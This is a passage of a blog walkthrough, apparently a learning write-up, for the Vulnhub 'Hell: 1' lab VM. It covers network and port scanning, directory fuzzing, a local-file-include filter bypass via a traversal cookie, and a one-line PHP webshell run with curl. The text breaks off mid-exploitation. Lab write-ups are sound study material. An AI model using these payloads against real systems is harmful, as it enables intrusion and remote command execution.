@@ -1,0 +1,2215 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
+	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
+	<meta charset="utf-8">
+	<title>[Vulnhub]Hell: 1  | F4l13n5n0w</title>
+
+<meta name="author" content="F4l13n5n0w"> 
+
+<meta name="description" content="This is a description"> <meta name="keywords" content="">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="F4l13n5n0w" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>
+
+<script language="Javascript" type="text/javascript">
+$(document).ready(
+  function() {
+    (function($) {
+      $(".fancybox[data-content-id]").each(function() {
+        this.href = $(this).data('content-id');
+      });
+      $(".fancybox").fancybox({
+        beforeLoad: function() {
+          var el, 
+              id = $(this.element).data('title-id');
+
+          if (id) {
+            el = $('#' + id);
+
+            if (el.length) {
+              this.title = el.html();
+            }
+          }
+          if ($(this).data('content')) {
+            this.content = $(this).data('content');
+          }
+        },
+        helpers: {
+          title: {
+            type: 'inside'
+          }
+        }
+      });
+    })(jQuery);
+  }
+);
+</script>
+
+	<link href='https://fonts.googleapis.com/css?family=Delius' rel='stylesheet' type='text/css'>
+</head>
+
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">F4l13n5n0w</a></h1>
+<h4>Info Security & Pen Testing learning notes</h4>
+<nav id="main-nav"><ul>
+	<li><a href="/about">瓷 | About</a></li>
+	<li><a href="/">段子 | Blogging</a></li>
+	<li><a href="/code-snippets">玩意儿 | Coding</a></li>
+	<li><a href="/reading-list">藏♥品 | Reading</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul>
+	<li><a href="/about">瓷 | About</a></li>
+	<li><a href="/">段子 | Blogging</a></li>
+	<li><a href="/code-snippets">玩意儿 | Coding</a></li>
+	<li><a href="/reading-list">藏♥品 | Reading</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:f4l13n5n0w.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+
+
+</header>
+
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">[Vulnhub]Hell: 1</h2>
+	<div class="entry-content"><p>&ldquo;This VM is designed to try and entertain the more advanced information security enthusiast. This doesn&rsquo;t exclude beginners however and I&rsquo;m sure that a few of you could meet the challenge. There is no &lsquo;one&rsquo; focus on the machine, a range of skills such as web exploitation, password cracking, exploit development, binary examination and most of all logical thinking is required to crack the box in the intended way - but who knows there might be some short cuts!</p>
+
+<p>A few of the skills needed can be seen in some posts on <a href="http://netsec.ws.">http://netsec.ws.</a> Otherwise enjoy the experience - remember that although vulnerabilities might not jump out at you straight away you may need to try some variations on the normal to get past the protections in place!&ldquo; &ndash; <a href="http://netsec.ws/">Peleus</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/hell-1,95/">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>
+
+<p>Target: Hell (<em>10.10.10.146/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<ul>
+<li>Local File Include vulnerability existed in one of cookie variable</li>
+<li>File upload function without any content filter will save any evil code into pre-defined file &lsquo;note.txt&rsquo; under folder &lsquo;/tmp/&rsquo;</li>
+<li>Sensitive information found in &lsquo;login.php&rsquo; which disclose jack&rsquo;s SSH password and Database password</li>
+<li>Use jack&rsquo;s PGP private key file to unlock the encrypted email file and found SSH password for another account &lsquo;milk_4_life&rsquo;</li>
+<li>&lsquo;game&rsquo; program has sticky bit set and will call another program &lsquo;chmod&rsquo; when user win the game, but it has not been using absolute path for &lsquo;chmod&rsquo;</li>
+<li>&lsquo;Rockyou&rsquo; dictionary based brute force attacking and cracked the password for &lsquo;Truecrypt&rsquo; container file found in george&rsquo;s home folder, found SSH private key file for another account &lsquo;bazza&rsquo;</li>
+<li>Very similar vulnerability as in &lsquo;game&rsquo; happened in another program &lsquo;part2&rsquo; which can be expolited to privilege escape to &lsquo;oj&rsquo;</li>
+<li>&lsquo;echo&rsquo; program has Format String vulnerability which should be able to be exploited to get ROOT</li>
+<li>&lsquo;Truecrypt&rsquo; has vulnerability which can make attacker to get ROOT</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
+<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
+<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>, <font color="FF8000">burp proxy</font>]</li>
+<li>brute fuzz to find hidden files and paths [<font color="FF8000">wfuzz</font>]</li>
+<li>Local file including vulnerability detect and exploit [<font color="FF8000">curl</font>]</li>
+<li>Truecrypt password brute force attacking [<font color="FF8000">truecrack</font>]</li>
+<li>Analysis and write script to win &lsquo;game&rsquo; program [<font color="FF8000">python</font>]</li>
+<li>Poked around in the file system and found sensitive information</li>
+<li>Hijack executable program to get privilege escalation</li>
+<li>Make evil truecrypt file to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="http://www.edge-security.com/wfuzz.php">wfuzz</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+<li><a href="https://portswigger.net/burp/">burpsuite</a></li>
+<li><a href="http://curl.haxx.se/">curl</a></li>
+<li><a href="https://code.google.com/p/truecrack/">truecrack</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using <code>netdiscover</code> as routine to detect the target&rsquo;s IP address (10.10.10.146 in this case).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netdiscover -r 10.10.10.0/24
+</span><span class='line'>
+</span><span class='line'> Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                               
+</span><span class='line'>                                                                                                                                                             
+</span><span class='line'> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                             
+</span><span class='line'> _____________________________________________________________________________
+</span><span class='line'>   IP            At MAC Address      Count  Len   MAC Vendor                   
+</span><span class='line'> ----------------------------------------------------------------------------- 
+</span><span class='line'> 10.10.10.1      00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                               
+</span><span class='line'> 10.10.10.2      00:50:56:e2:f9:10    01    060   VMWare, Inc.                                                                                               
+</span><span class='line'> 10.10.10.146    00:0c:29:e2:78:6f    01    060   VMware, Inc.                                                                                               
+</span><span class='line'> 10.10.10.254    00:50:56:fb:67:d4    01    060   VMWare, Inc.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>10.10.10.146 is our Target!</p>
+
+<p>Next, run <code>nmap</code> to scan open services on the target.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sV -O -A -p- -T5 10.10.10.146
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-13 08:24 EDT
+</span><span class='line'>Nmap scan report for 10-10-10-146.tpgi.com.au (10.10.10.146)
+</span><span class='line'>Host is up (0.00044s latency).
+</span><span class='line'>Not shown: 65529 closed ports
+</span><span class='line'>PORT      STATE    SERVICE VERSION
+</span><span class='line'>22/tcp    open     ssh     OpenSSH 6.0p1 Debian 4+deb7u1 (protocol 2.0)
+</span><span class='line'>| ssh-hostkey: 
+</span><span class='line'>|   1024 f4:bb:f4:22:36:08:61:ef:74:2c:27:e0:b4:a2:69:d3 (DSA)
+</span><span class='line'>|   2048 0e:31:1d:cf:04:d0:63:fa:5c:76:f2:dc:22:1c:f1:7c (RSA)
+</span><span class='line'>|_  256 e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa (ECDSA)
+</span><span class='line'>80/tcp    open     http    Apache httpd 2.2.22 ((Debian))
+</span><span class='line'>|_http-methods: GET HEAD POST OPTIONS
+</span><span class='line'>| http-robots.txt: 2 disallowed entries 
+</span><span class='line'>|_/personal/ /super_secret_login_path_muhahaha/
+</span><span class='line'>|_http-title: Have fun!
+</span><span class='line'>111/tcp   open     rpcbind 2-4 (RPC #100000)
+</span><span class='line'>| rpcinfo: 
+</span><span class='line'>|   program version   port/proto  service
+</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
+</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
+</span><span class='line'>|   100024  1          44490/tcp  status
+</span><span class='line'>|_  100024  1          52715/udp  status
+</span><span class='line'>666/tcp   open     doom?
+</span><span class='line'>1337/tcp  filtered waste
+</span><span class='line'>44490/tcp open     status  1 (RPC #100024)
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ports 22 and 80 open, and two very interesting folders found on port 80: <code>\personal</code> and <code>\super_secret_login_path_muhahaha\</code>. Then using <code>wfuzz</code> to reveal more possible hidden folders and files:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# wfuzz -c --hc 404 -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php
+</span><span class='line'>
+</span><span class='line'>********************************************************
+</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
+</span><span class='line'>********************************************************
+</span><span class='line'>
+</span><span class='line'>Target: http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php
+</span><span class='line'>Payload type: file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+</span><span class='line'>
+</span><span class='line'>Total requests: 81643
+</span><span class='line'>==================================================================
+</span><span class='line'>ID    Response   Lines      Word         Chars          Request    
+</span><span class='line'>==================================================================
+</span><span class='line'>
+</span><span class='line'>00001:  C=200     17 L          33 W      371 Ch    " - #"
+</span><span class='line'>00002:  C=200     17 L          33 W      371 Ch    " - # directory-list-lowercase-2.3-small.txt"
+</span><span class='line'>00003:  C=200     17 L          33 W      371 Ch    " - # Copyright 2007 James Fisher"
+</span><span class='line'>00004:  C=200     17 L          33 W      371 Ch    "on-Share Alike 3.0 License. To view a copy of this"
+</span><span class='line'>00005:  C=200     17 L          33 W      371 Ch    "# This work is licensed under the Creative Commons"
+</span><span class='line'>00006:  C=200     17 L          33 W      371 Ch    "sit http://creativecommons.org/licenses/by-sa/3.0/"
+</span><span class='line'>00007:  C=200     17 L          33 W      371 Ch    " - #"
+</span><span class='line'>00008:  C=200     17 L          33 W      371 Ch    " - #"
+</span><span class='line'>00009:  C=200     17 L          33 W      371 Ch    " Suite 300, San Francisco, California, 94105, USA."
+</span><span class='line'>00010:  C=200     17 L          33 W      371 Ch    "ed case insensative list, where entries were found"
+</span><span class='line'>00011:  C=200     17 L          33 W      371 Ch    " - # on atleast 3 different hosts"
+</span><span class='line'>00012:  C=200     17 L          33 W      371 Ch    "d a letter to Creative Commons, 171 Second Street,"
+</span><span class='line'>00016:  C=403     10 L          30 W      317 Ch    " - "
+</span><span class='line'>00017:  C=200     17 L          33 W      371 Ch    " - index"
+</span><span class='line'>00028:  C=200     17 L          33 W      371 Ch    " - #"
+</span><span class='line'>00063:  C=302      0 L           0 W        0 Ch    " - login"
+</span><span class='line'>00193:  C=200      5 L          19 W      163 Ch    " - mail"
+</span><span class='line'>00198:  C=200      2 L           2 W       19 Ch    " - users"
+</span><span class='line'>00470:  C=302     17 L          35 W      387 Ch    " - personal"
+</span><span class='line'>00572:  C=200      7 L          21 W      170 Ch    " - server"
+</span><span class='line'>01051:  C=200      5 L          20 W      179 Ch    " - notes"
+</span><span class='line'>01255:  C=302      1 L           0 W        2 Ch    " - check"
+</span><span class='line'>05186:  C=302     21 L          38 W      566 Ch    " - panel"
+</span><span class='line'>Stopping...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After I checked those revealed files, I found three interesting ones: <code>1.php</code>, <code>check.php</code> and <code>notes.php</code>.</p>
+
+<p>Having a look at <code>1.php</code>, there is only one sentence: <font color="red">INTRUDER ALERT!</font> which is in Red color and all Capital.</p>
+
+<p>By playing <code>check.php</code> with Burp proxy, I noticed that if user input wrong username/password, the cookie variable <code>failcount</code> will increase. However when input the wrong username/password more than 3 times, a new cookie <code>intruder</code> will be added and the value is always 1.</p>
+
+<p>Also the <code>check.php</code> will request <code>personal.php</code> and <code>panel.php</code> as well, something noticeable in <code>panel.php</code> is that the red color alert: <font color="red">INTRUDER ALERT!</font> which is same as the content of <code>1.php</code>.</p>
+
+<p>So based on the above facts and analysis, I could guess that the <code>panel.php</code> has included the <code>1.php</code> when user input wrong username/password over 3 times. As a result, I firstly modified the cookie value of <code>intruder</code> to <code>../../../../etc/passwd</code> but the respond is not excepted&hellip; might be the admin set a filter here or something like that. After I read the page in OWASP testing <a href="https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)">guide</a>, I finally found a well-working payload: <code>....//....//....//....//....//....//etc//passwd</code>.</p>
+
+<p><img class="left" src="/downloads/Hell1/1.png"></p>
+
+<p>Here is a Local File Include vulnerability found.</p>
+
+<p>Now it&rsquo;s time to move to <code>notes.php</code>.</p>
+
+<p>Taking a close look at notes.php, I noticed that we can write anything and it will be saved in temporary folder(mostly possible is /tmp/ in Linux) as the name is <code>note.txt</code>.</p>
+
+<p><img class="left" src="/downloads/Hell1/2.png"></p>
+
+<p>After some trying, it is proved that the <code>note.txt</code> file is saved in <code>/tmp/</code> folder.</p>
+
+<p>Then I wrote one-line PHP webshell to note.txt, then use File Include vulnerability found previously to include the webshell.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="left" src="/downloads/Hell1/3.png"></p>
+
+<p>Now I have already got a webshell and can run system command which is ready to poke around on the server file system.</p>
+
+<p>In order to make the life easier, I use <code>curl</code> instead of burp proxy to interactive with target server.</p>
+
+<p>First to request <code>check.php</code>, we can see that cookies <code>PHPSESSID</code> and <code>failcount</code> have been set.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl -v -L http://10.10.10.146/super_secret_login_path_muhahaha/check.php -c cookies -b cookies
+</span><span class='line'>* About to connect() to 10.10.10.146 port 80 (#0)
+</span><span class='line'>*   Trying 10.10.10.146...
+</span><span class='line'>* connected
+</span><span class='line'>* Connected to 10.10.10.146 (10.10.10.146) port 80 (#0)
+</span><span class='line'>&gt; GET /super_secret_login_path_muhahaha/check.php HTTP/1.1
+</span><span class='line'>&gt; User-Agent: curl/7.26.0
+</span><span class='line'>&gt; Host: 10.10.10.146
+</span><span class='line'>&gt; Accept: */*
+</span><span class='line'>&gt;
+</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
+</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
+</span><span class='line'><span class="nt">&lt; HTTP</span><span class="err">/</span><span class="na">1</span><span class="err">.</span><span class="na">1</span> <span class="na">302</span> <span class="na">Found</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Date:</span> <span class="na">Wed</span><span class="err">,</span> <span class="na">15</span> <span class="na">Jul</span> <span class="na">2015</span> <span class="na">00:06:37</span> <span class="na">GMT</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Server:</span> <span class="na">Apache</span><span class="err">/</span><span class="na">2</span><span class="err">.</span><span class="na">2</span><span class="err">.</span><span class="na">22</span> <span class="err">(</span><span class="na">Debian</span><span class="err">)</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">X-Powered-By:</span> <span class="na">PHP</span><span class="err">/</span><span class="na">5</span><span class="err">.</span><span class="na">4</span><span class="err">.</span><span class="na">4-14</span><span class="err">+</span><span class="na">deb7u11</span>
+</span><span class='line'><span class="err">*</span> <span class="na">Added</span> <span class="na">cookie</span> <span class="na">PHPSESSID=</span><span class="s">&quot;cb11eurq57no9kbu8k09pvt0d5&quot;</span> <span class="na">for</span> <span class="na">domain</span> <span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span><span class="err">,</span> <span class="na">path</span> <span class="err">/,</span> <span class="na">expire</span> <span class="na">0</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Set-Cookie:</span> <span class="na">PHPSESSID=</span><span class="s">cb11eurq57no9kbu8k09pvt0d5;</span> <span class="na">path=</span><span class="s">/</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Expires:</span> <span class="na">Thu</span><span class="err">,</span> <span class="na">19</span> <span class="na">Nov</span> <span class="na">1981</span> <span class="na">08:52:00</span> <span class="na">GMT</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Cache-Control:</span> <span class="na">no-store</span><span class="err">,</span> <span class="na">no-cache</span><span class="err">,</span> <span class="na">must-revalidate</span><span class="err">,</span> <span class="na">post-check=</span><span class="s">0,</span> <span class="na">pre-check=</span><span class="s">0</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Pragma:</span> <span class="na">no-cache</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Location:</span> <span class="na">personal</span><span class="err">.</span><span class="na">php</span>
+</span><span class='line'><span class="err">*</span> <span class="na">Added</span> <span class="na">cookie</span> <span class="na">failcount=</span><span class="s">&quot;1&quot;</span> <span class="na">for</span> <span class="na">domain</span> <span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span><span class="err">,</span> <span class="na">path</span> <span class="err">/</span><span class="na">super_secret_login_path_muhahaha</span><span class="err">/,</span> <span class="na">expire</span> <span class="na">0</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Set-Cookie:</span> <span class="na">failcount=</span><span class="s">1</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Vary:</span> <span class="na">Accept-Encoding</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Content-Length:</span> <span class="na">2</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Content-Type:</span> <span class="na">text</span><span class="err">/</span><span class="na">html</span>
+</span><span class='line'><span class="err">&lt;</span>
+</span><span class='line'><span class="err">*</span> <span class="na">Ignoring</span> <span class="na">the</span> <span class="na">response-body</span>
+</span><span class='line'><span class="err">*</span> <span class="na">Connection</span> <span class="err">#</span><span class="na">0</span> <span class="na">to</span> <span class="na">host</span> <span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span> <span class="na">left</span> <span class="na">intact</span>
+</span><span class='line'><span class="err">*</span> <span class="na">Issue</span> <span class="na">another</span> <span class="na">request</span> <span class="na">to</span> <span class="na">this</span> <span class="na">URL:</span> <span class="err">&#39;</span><span class="na">http:</span><span class="err">//</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span><span class="err">/</span><span class="na">super_secret_login_path_muhahaha</span><span class="err">/</span><span class="na">personal</span><span class="err">.</span><span class="na">php</span><span class="err">&#39;</span>
+</span><span class='line'><span class="err">*</span> <span class="na">Re-using</span> <span class="na">existing</span> <span class="na">connection</span><span class="err">!</span> <span class="err">(#</span><span class="na">0</span><span class="err">)</span> <span class="na">with</span> <span class="na">host</span> <span class="err">(</span><span class="na">nil</span><span class="err">)</span>
+</span><span class='line'><span class="err">*</span> <span class="na">Connected</span> <span class="na">to</span> <span class="err">(</span><span class="na">nil</span><span class="err">)</span> <span class="err">(</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span><span class="err">)</span> <span class="na">port</span> <span class="na">80</span> <span class="err">(#</span><span class="na">0</span><span class="err">)</span>
+</span><span class='line'><span class="nt">&gt;</span> GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
+</span><span class='line'>&gt; User-Agent: curl/7.26.0
+</span><span class='line'>&gt; Host: 10.10.10.146
+</span><span class='line'>&gt; Accept: */*
+</span><span class='line'>&gt; Cookie: failcount=1; PHPSESSID=cb11eurq57no9kbu8k09pvt0d5
+</span><span class='line'>&gt;
+</span><span class='line'>
+</span><span class='line'>root@kali:~/hell# cat cookies
+</span><span class='line'># Netscape HTTP Cookie File
+</span><span class='line'># http://curl.haxx.se/rfc/cookie_spec.html
+</span><span class='line'># This file was generated by libcurl! Edit at your own risk.
+</span><span class='line'>
+</span><span class='line'>10.10.10.146  FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
+</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   1
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>New cookie &ldquo;intruder&rdquo; has been set after running the same command 3 times.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# cat cookies 
+</span><span class='line'># Netscape HTTP Cookie File
+</span><span class='line'># http://curl.haxx.se/rfc/cookie_spec.html
+</span><span class='line'># This file was generated by libcurl! Edit at your own risk.
+</span><span class='line'>
+</span><span class='line'>10.10.10.146  FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
+</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   3
+</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   intruder    1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I change the value of cookie <code>intruder</code> to include our webshell file: <code>/tmp/note.txt</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# cat cookies
+</span><span class='line'># Netscape HTTP Cookie File
+</span><span class='line'># http://curl.haxx.se/rfc/cookie_spec.html
+</span><span class='line'># This file was generated by libcurl! Edit at your own risk.
+</span><span class='line'>
+</span><span class='line'>10.10.10.146  FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
+</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   3
+</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   intruder    ....//....//....//....//....//....//tmp//note.txt
+</span><span class='line'>root@kali:~/hell# curl -v http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=id -c cookies -b cookies
